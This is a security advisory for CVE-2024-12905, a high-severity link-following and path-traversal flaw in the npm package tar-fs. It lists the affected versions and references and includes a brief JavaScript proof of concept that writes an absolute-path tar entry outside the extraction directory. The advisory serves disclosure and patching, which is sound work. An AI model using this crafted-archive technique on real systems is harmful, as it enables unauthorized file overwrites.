# [H] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File

## Summary
Severity: High
Advisory: GHSA-pq67-2wwv-3xjx
CVE: CVE-2024-12905
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2025-03-27
Source: https://github.com/advisories/GHSA-pq67-2wwv-3xjx
Type: github-advisory

## Affected
- npm: `tar-fs` — affected >=0 <1.16.4
- npm: `tar-fs` — affected >=2.0.0 <2.1.2
- npm: `tar-fs` — affected >=3.0.0 <3.0.7

## Details
An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.

This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.

### PoC
```javascript
// Create a writable stream to extract the tar content
const extractStream = tarfs.extract('/', {
    // We can ignore the file type checks to allow the extraction of the malicious file
    ignore: (name) => false,
});

// Create a tar stream
const tarStream = tarfs.pack().on('error', (err) => {
    throw err;
});

// Append the malicious entry to the tar stream
tarStream.entry({ name: '/flag.txt', mode: 0o644 }, Buffer.from('This is a flag!'));

// Finalize the tar stream
tarStream.finalize();

// Pipe the tar stream into the extract stream
tarStream.pipe(extractStream);
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2024-12905
- https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed
- https://arxiv.org/abs/2506.04962
- https://arxiv.org/pdf/2506.04962
- https://github.com/mafintosh/tar-fs
- https://lists.debian.org/debian-lts-announce/2025/06/msg00012.html
- https://www.seal.security/blog/a-link-to-the-past-uncovering-a-new-vulnerability-in-tar-fs
